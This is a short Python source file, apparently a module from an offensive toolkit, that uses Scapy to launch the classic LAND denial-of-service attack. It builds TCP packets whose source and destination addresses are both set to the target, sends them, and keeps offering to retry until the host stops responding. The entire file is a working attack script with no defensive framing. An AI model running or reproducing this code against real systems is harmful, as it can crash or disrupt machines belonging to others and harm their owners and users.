from scapy.all import *
from dos import DoS
import util


class land_dos(DoS):
    def __init__(self):
        super(land_dos, self).__init__('LAND DoS')
        conf.verb = 0
        self.info = """
                    Oldie but a goodie.  This exploits the classic LAND attack
                    against Windows machines.  Essentially we set the source 
                    equal to the destination, which causes a loop and
                    eventually a crash.

                    http://insecure.org/sploits/land.ip.DOS.html
                    """

    def initialize(self):
        target = self.config['target']['value']
        pkt = IP(src=target, dst=target)
        pkt /= TCP(sport=134, dport=134)

        while True:
            print '[!] DoSing %s...' % target
            send(pkt)

            if self.is_alive():
                util.Msg('Host appears to still be up.')
                try:
                    tmp = raw_input('[!] Try again? [Y/n] ')
                except Exception:
                    break
                if 'n' in tmp.lower():
                    break
            else:
                util.Msg('Host not responding!')
                break